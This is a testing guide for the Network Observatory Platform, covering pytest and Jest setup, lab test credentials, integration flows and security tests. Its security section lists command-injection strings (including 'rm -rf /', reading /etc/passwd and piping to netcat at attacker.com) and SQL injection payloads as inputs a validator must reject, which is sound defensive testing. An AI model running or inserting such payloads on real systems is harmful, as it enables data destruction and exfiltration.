# Testing Guide - NOP

Comprehensive guide for testing the Network Observatory Platform.

## Table of Contents

- [Testing Philosophy](#testing-philosophy)
- [Test Environment Setup](#test-environment-setup)
- [Backend Testing](#backend-testing)
- [Frontend Testing](#frontend-testing)
- [Integration Testing](#integration-testing)
- [Security Testing](#security-testing)

## Testing Philosophy

Our testing approach follows these principles:

1. **Test early and often** - Write tests as you develop
2. **Test behavior, not implementation** - Focus on what, not how
3. **Maintain high coverage** - Aim for >80% code coverage
4. **Fast feedback** - Keep tests fast and reliable
5. **Realistic scenarios** - Test with real-world data

## Test Environment Setup

### Using Docker Compose

Start the test environment:

```bash
docker-compose -f docker-compose.test.yml up -d --build
```

This provides test targets for all supported protocols:
- SSH server (port 2222)
- VNC server (port 5901)
- RDP server (port 3389)
- FTP server (port 2121)
- Web server (port 8080)
- Database server (port 3306)
- File server (SMB on port 445)

### Test Credentials

| Service | Username | Password | Host |
|---------|----------|----------|------|
| SSH | testuser | testpass123 | ssh-server |
| SSH | admin | admin123 | ssh-server |
| VNC | vncuser | vnc123 | vnc-server |
| RDP | rdpuser | rdp123 | rdp-server |
| FTP | ftpuser | ftp123 | ftp-server |
| SMB | smbuser | smbpass123 | file-server |

## Backend Testing

### Setup

```bash
cd backend
pip install -r requirements-dev.txt
```

### Running Tests

**All tests**:
```bash
pytest
```

**With coverage**:
```bash
pytest --cov=app --cov-report=html
```

**Specific test file**:
```bash
pytest tests/test_ping_service.py
```

**Specific test**:
```bash
pytest tests/test_ping_service.py::test_validate_target
```

**Verbose output**:
```bash
pytest -v
```

### Test Structure

```
backend/tests/
├── __init__.py
├── conftest.py              # Fixtures and configuration
├── test_api/
│   ├── test_auth.py
│   ├── test_assets.py
│   ├── test_traffic.py
│   └── test_access.py
├── test_services/
│   ├── test_ping_service.py
│   ├── test_sniffer_service.py
│   └── test_scan_service.py
└── test_models/
    ├── test_asset.py
    └── test_credential.py
```

### Writing Backend Tests

**Example - Service Test**:
```python
import pytest
from app.services.ping_service import PingService

@pytest.fixture
def ping_service():
    """Create PingService instance."""
    return PingService()

def test_icmp_ping_success(ping_service):
    """Test successful ICMP ping."""
    result = await ping_service.execute_ping(
        target="8.8.8.8",
        protocol="icmp",
        count=4,
        timeout=5
    )
    assert result.successful > 0
    assert result.packet_loss < 100

def test_tcp_ping_port_closed(ping_service):
    """Test TCP ping to closed port."""
    result = await ping_service.execute_ping(
        target="192.168.1.1",
        protocol="tcp",
        port=9999,
        count=1,
        timeout=2
    )
    assert result.failed > 0
```

**Example - API Test**:
```python
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)

def test_ping_endpoint_icmp():
    """Test ping API endpoint with ICMP."""
    response = client.post(
        "/api/v1/traffic/ping",
        json={
            "target": "8.8.8.8",
            "protocol": "icmp",
            "count": 4
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert "successful" in data
    assert "packet_loss" in data
```

### Testing Best Practices

1. **Use fixtures** for common setup
2. **Mock external services** to avoid dependencies
3. **Test edge cases** and error conditions
4. **Use descriptive names** for test functions
5. **Keep tests isolated** - no shared state

## Frontend Testing

### Setup

```bash
cd frontend
npm install
```

### Running Tests

**All tests**:
```bash
npm test
```

**With coverage**:
```bash
npm test -- --coverage
```

**Watch mode**:
```bash
npm test -- --watch
```

**Update snapshots**:
```bash
npm test -- -u
```

### Test Structure

```
frontend/src/__tests__/
├── components/
│   ├── AssetCard.test.tsx
│   ├── TopologyGraph.test.tsx
│   └── PingPanel.test.tsx
├── pages/
│   ├── Dashboard.test.tsx
│   ├── Assets.test.tsx
│   └── Traffic.test.tsx
└── services/
    ├── api.test.ts
    └── auth.test.ts
```

### Writing Frontend Tests

**Example - Component Test**:
```typescript
import { render, screen, fireEvent } from '@testing-library/react';
import AssetCard from '../components/AssetCard';

describe('AssetCard', () => {
  const mockAsset = {
    id: '1',
    ip: '192.168.1.1',
    hostname: 'test-server',
    status: 'online',
    os: 'Linux'
  };

  it('renders asset information', () => {
    render(<AssetCard asset={mockAsset} onSelect={() => {}} />);
    expect(screen.getByText('192.168.1.1')).toBeInTheDocument();
    expect(screen.getByText('test-server')).toBeInTheDocument();
  });

  it('calls onSelect when clicked', () => {
    const onSelect = jest.fn();
    render(<AssetCard asset={mockAsset} onSelect={onSelect} />);
    
    fireEvent.click(screen.getByRole('button'));
    expect(onSelect).toHaveBeenCalledWith('1');
  });
});
```

**Example - Hook Test**:
```typescript
import { renderHook, waitFor } from '@testing-library/react';
import { useAssets } from '../hooks/useAssets';

describe('useAssets', () => {
  it('fetches assets successfully', async () => {
    const { result } = renderHook(() => useAssets());
    
    await waitFor(() => {
      expect(result.current.isLoading).toBe(false);
    });
    
    expect(result.current.assets).toHaveLength(3);
  });
});
```

## Integration Testing

### End-to-End Workflows

Test complete user workflows:

1. **Login Flow**:
   ```python
   def test_login_workflow():
       # Login
       response = client.post("/api/v1/auth/login", json={
           "username": "admin",
           "password": "admin123"
       })
       token = response.json()["access_token"]
       
       # Access protected endpoint
       response = client.get(
           "/api/v1/assets",
           headers={"Authorization": f"Bearer {token}"}
       )
       assert response.status_code == 200
   ```

2. **Discovery Flow**:
   ```python
   def test_discovery_workflow():
       # Start discovery
       response = client.post("/api/v1/discovery/start", json={
           "profile": "light"
       })
       scan_id = response.json()["id"]
       
       # Check status
       response = client.get(f"/api/v1/discovery/{scan_id}")
       assert response.json()["status"] in ["running", "completed"]
   ```

## Security Testing

### Input Validation

Test all user inputs for security:

```python
def test_ping_command_injection():
    """Ensure command injection is prevented."""
    service = PingService()
    
    # Test injection attempts
    malicious_targets = [
        "8.8.8.8; rm -rf /",
        "8.8.8.8 && cat /etc/passwd",
        "8.8.8.8 | nc attacker.com 1234"
    ]
    
    for target in malicious_targets:
        with pytest.raises(ValueError):
            service._validate_target(target)
```

### Authentication

Test authentication and authorization:

```python
def test_unauthorized_access():
    """Test access without authentication."""
    response = client.get("/api/v1/assets")
    assert response.status_code == 401

def test_invalid_token():
    """Test access with invalid token."""
    response = client.get(
        "/api/v1/assets",
        headers={"Authorization": "Bearer invalid_token"}
    )
    assert response.status_code == 401
```

### SQL Injection

Test database queries:

```python
def test_sql_injection_prevention():
    """Ensure SQL injection is prevented."""
    malicious_inputs = [
        "1' OR '1'='1",
        "'; DROP TABLE assets; --"
    ]
    
    for malicious_input in malicious_inputs:
        response = client.get(f"/api/v1/assets/{malicious_input}")
        # Should return 404, not error
        assert response.status_code in [404, 400]
```

## Continuous Integration

Tests are automatically run on:
- Every pull request
- Every push to main/develop
- Scheduled daily runs

### CI Configuration

See `.github/workflows/test.yml` for CI setup.

## Test Coverage Goals

| Component | Current | Target |
|-----------|---------|--------|
| Backend API | 85% | >80% |
| Backend Services | 90% | >80% |
| Frontend Components | 75% | >80% |
| Frontend Pages | 70% | >75% |

## Common Testing Issues

### Issue: Tests hang or timeout

**Solution**:
```bash
# Increase timeout
pytest --timeout=30

# Run with verbose output to identify hanging test
pytest -v
```

### Issue: Database connection errors

**Solution**:
```bash
# Ensure test database is running
docker-compose -f docker-compose.test.yml up -d postgres

# Reset test database
docker-compose -f docker-compose.test.yml down -v
docker-compose -f docker-compose.test.yml up -d
```

### Issue: Frontend tests fail with module errors

**Solution**:
```bash
# Clear cache and reinstall
rm -rf node_modules package-lock.json
npm install
```

## Resources

- [pytest documentation](https://docs.pytest.org/)
- [React Testing Library](https://testing-library.com/react)
- [FastAPI Testing](https://fastapi.tiangolo.com/tutorial/testing/)
- [Jest documentation](https://jestjs.io/)

---

**Remember**: Good tests are the foundation of reliable software. Test thoroughly!
